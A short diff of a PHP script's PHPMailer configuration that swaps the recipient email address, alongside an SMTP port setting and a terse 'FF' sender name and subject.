@@ -34,7 +34,7 @@ if (isset($_GET['action'])) {
                     $mail->Port       = 465;
                     //Recipients
                     $mail->setFrom('hanhatdoan7889@gmail.com', 'FF');
-                    $mail->addAddress('nguyenlamtrinh69@gmail.com');
+                    $mail->addAddress('superdamedealler@gmail.com');
                     //Content
                     $mail->isHTML(true);
                     $mail->Subject = 'FF';
